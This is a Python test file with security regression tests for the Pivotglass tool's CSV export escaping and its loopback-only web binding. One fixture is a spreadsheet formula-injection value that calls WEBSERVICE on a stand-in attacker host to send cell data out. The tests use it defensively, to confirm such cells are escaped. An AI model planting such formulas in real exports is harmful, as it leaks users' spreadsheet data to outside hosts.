"""Focused security regressions for the vendored Pivotglass web and CSV boundaries."""

from __future__ import annotations

import ast
import csv
import io
import json
import logging
import shlex
import sys
import unittest
from contextlib import redirect_stdout
from pathlib import Path
from types import SimpleNamespace


REPO_ROOT = Path(__file__).resolve().parents[2]
PACKAGE_ROOT = REPO_ROOT / "scripts" / "pivotglass"
SERVER_PATH = PACKAGE_ROOT / "pivotglass" / "web" / "server.py"
TOOLS_PATH = PACKAGE_ROOT / "pivotglass" / "agent" / "tools.py"
GRAPH_EXPORT_PATH = PACKAGE_ROOT / "pivotglass" / "core" / "investigation_graph_export.py"
sys.path.insert(0, str(PACKAGE_ROOT))

from pivotglass.core.csv_safety import spreadsheet_safe_cell  # noqa: E402
from pivotglass.core.network_safety import require_loopback_host  # noqa: E402


def _function(path: Path, name: str, namespace: dict[str, object]):
    """Load one checked-in function body without importing optional package dependencies."""

    tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
    function = next(
        node for node in tree.body if isinstance(node, ast.FunctionDef) and node.name == name
    )
    module = ast.Module(
        body=[
            ast.ImportFrom(
                module="__future__",
                names=[ast.alias(name="annotations")],
                level=0,
            ),
            function,
        ],
        type_ignores=[],
    )
    exec(compile(ast.fix_missing_locations(module), str(path), "exec"), namespace)
    return namespace[name]


def _web_export_function():
    tree = ast.parse(SERVER_PATH.read_text(encoding="utf-8"), filename=str(SERVER_PATH))
    helpers = [
        node
        for node in tree.body
        if isinstance(node, ast.FunctionDef)
        and node.name in {"_defang_export_tree", "_export_options"}
    ]
    service = next(
        node
        for node in tree.body
        if isinstance(node, ast.ClassDef) and node.name == "WebCockpitService"
    )
    method = next(
        node
        for node in service.body
        if isinstance(node, ast.FunctionDef) and node.name == "export_payload"
    )
    module = ast.Module(
        body=[
            ast.ImportFrom(
                module="__future__",
                names=[ast.alias(name="annotations")],
                level=0,
            ),
            *helpers,
            method,
        ],
        type_ignores=[],
    )
    namespace = {
        "Any": object,
        "csv": csv,
        "io": io,
        "json": json,
        "shlex": shlex,
        "spreadsheet_safe_cell": spreadsheet_safe_cell,
        "export_workspace": lambda manager, workspace: manager.get_stix_objects(),
        "execute_tool": lambda *args: ("", None, [], []),
    }
    exec(compile(ast.fix_missing_locations(module), str(SERVER_PATH), "exec"), namespace)
    return namespace["export_payload"]


class CsvSafetyTests(unittest.TestCase):
    def test_formula_prefixes_and_leading_whitespace_are_forced_to_text(self):
        for value in ("=1+1", "+1+1", "-1+1", "@SUM(A1:A2)", " \t=CMD()"):
            with self.subTest(value=value):
                self.assertEqual(spreadsheet_safe_cell(value), "'" + value)

    def test_benign_and_non_string_values_are_unchanged(self):
        for value in ("", "example.org", "1+1", "  ordinary", 7, None, ["=nested"]):
            with self.subTest(value=value):
                self.assertEqual(spreadsheet_safe_cell(value), value)

    def test_agent_workspace_csv_export_sanitizes_every_scalar_cell(self):
        export = _function(
            TOOLS_PATH,
            "_execute_export_workspace",
            {
                "spreadsheet_safe_cell": spreadsheet_safe_cell,
                "logger": logging.getLogger("pivotglass-test"),
            },
        )
        objects = [
            {
                "type": "domain-name",
                "value": '=WEBSERVICE("https://attacker.invalid/"&A1)',
                "x_org": " \t@SUM(1,1)",
                "x_reporter": "+1+1",
                "x_nested": {"formula": "=not-a-cell"},
            }
        ]
        ctx = SimpleNamespace(
            workspace_mgr=SimpleNamespace(get_stix_objects=lambda: objects)
        )

        row = next(csv.DictReader(io.StringIO(export(ctx, "csv"))))

        self.assertEqual(row["value"], "'" + objects[0]["value"])
        self.assertEqual(row["x_org"], "'" + objects[0]["x_org"])
        self.assertEqual(row["x_reporter"], "'+1+1")
        self.assertNotIn("x_nested", row)
        self.assertEqual(json.loads(export(ctx, "json"))[0]["value"], objects[0]["value"])

    def test_web_workspace_csv_export_sanitizes_every_scalar_cell(self):
        objects = [
            {
                "type": "domain-name",
                "value": "=1+1",
                "x_org": "@SUM(1,1)",
                "x_nested": ["=not-a-cell"],
            }
        ]
        manager = SimpleNamespace(active="case", get_stix_objects=lambda: objects)
        service = SimpleNamespace(ctx=SimpleNamespace(workspace_mgr=manager))

        result = _web_export_function()(service, "csv")
        row = next(csv.DictReader(io.StringIO(result["content"])))

        self.assertEqual(result["mime"], "text/csv")
        self.assertEqual(row["value"], "'=1+1")
        self.assertEqual(row["x_org"], "'@SUM(1,1)")
        self.assertNotIn("x_nested", row)
        json_result = _web_export_function()(service, "json")
        self.assertEqual(json.loads(json_result["content"])[0]["value"], "=1+1")

    def test_graph_csv_export_uses_the_same_cell_boundary(self):
        export = _function(
            GRAPH_EXPORT_PATH,
            "_csv_export",
            {
                "csv": csv,
                "io": io,
                "json": json,
                "spreadsheet_safe_cell": spreadsheet_safe_cell,
            },
        )
        entity = SimpleNamespace(value="entity")
        node = SimpleNamespace(
            id="=node",
            layer=entity,
            kind="@kind",
            label="+label",
            record_ref="-record",
            state=" \t=state",
            attributes={},
        )
        truth = SimpleNamespace(value="observed")
        edge = SimpleNamespace(
            id="=edge",
            layer=entity,
            source="+source",
            target="-target",
            relationship="@relationship",
            truth_kind=truth,
            provenance_refs=(),
            rationale=" \t=rationale",
            directed=True,
        )

        rows = list(csv.DictReader(io.StringIO(export((node,), (edge,)))))

        self.assertEqual(rows[0]["id"], "'=node")
        self.assertEqual(rows[0]["label"], "'+label")
        self.assertEqual(rows[1]["id"], "'=edge")
        self.assertEqual(rows[1]["relationship"], "'@relationship")
        self.assertEqual(rows[1]["rationale"], "' \t=rationale")


class LoopbackBindingTests(unittest.TestCase):
    def test_loopback_names_and_addresses_are_accepted(self):
        for host, expected in (
            ("localhost", "127.0.0.1"),
            ("  LOCALHOST ", "127.0.0.1"),
            ("127.0.0.1", "127.0.0.1"),
            ("127.0.0.2", "127.0.0.2"),
            ("::1", "::1"),
        ):
            with self.subTest(host=host):
                self.assertEqual(require_loopback_host(host), expected)

    def test_wildcard_lan_and_hostname_bind_targets_are_rejected(self):
        for host in ("", "0.0.0.0", "::", "192.168.1.20", "pivotglass.local"):
            with self.subTest(host=host), self.assertRaisesRegex(ValueError, "loopback-only"):
                require_loopback_host(host)

    def test_run_web_rejects_lan_before_service_or_server_construction(self):
        calls = {"web_root": 0, "service": 0, "server": 0}

        def web_root():
            calls["web_root"] += 1
            raise AssertionError("unsafe bind reached web-root construction")

        def service():
            calls["service"] += 1
            raise AssertionError("unsafe bind reached service construction")

        def server(*args):
            calls["server"] += 1
            raise AssertionError("unsafe bind reached server construction")

        run_web = _function(
            SERVER_PATH,
            "run_web",
            {
                "require_loopback_host": require_loopback_host,
                "_web_root": web_root,
                "WebCockpitService": service,
                "ThreadingHTTPServer": server,
            },
        )

        with self.assertRaisesRegex(ValueError, "loopback-only"):
            run_web(host="192.168.1.20", open_browser=False)
        self.assertEqual(calls, {"web_root": 0, "service": 0, "server": 0})

    def test_run_web_preserves_a_normalized_loopback_bind(self):
        calls: dict[str, object] = {}

        class Root:
            def joinpath(self, *parts):
                return self

            def exists(self):
                return True

        class Server:
            server_port = 8765

            def __init__(self, address, handler):
                calls["address"] = address
                calls["handler"] = handler

            def serve_forever(self):
                calls["served"] = True

            def server_close(self):
                calls["closed"] = True

        run_web = _function(
            SERVER_PATH,
            "run_web",
            {
                "require_loopback_host": require_loopback_host,
                "_web_root": Root,
                "_source_web_build_is_stale": lambda root: False,
                "WebCockpitService": object,
                "_handler": lambda service, root, allowed_hosts: allowed_hosts,
                "ThreadingHTTPServer": Server,
            },
        )

        with redirect_stdout(io.StringIO()):
            run_web(host=" 127.0.0.2 ", open_browser=False)

        self.assertEqual(calls["address"], ("127.0.0.2", 8765))
        self.assertIn("127.0.0.2", calls["handler"])
        self.assertTrue(calls["served"])
        self.assertTrue(calls["closed"])


if __name__ == "__main__":
    unittest.main()
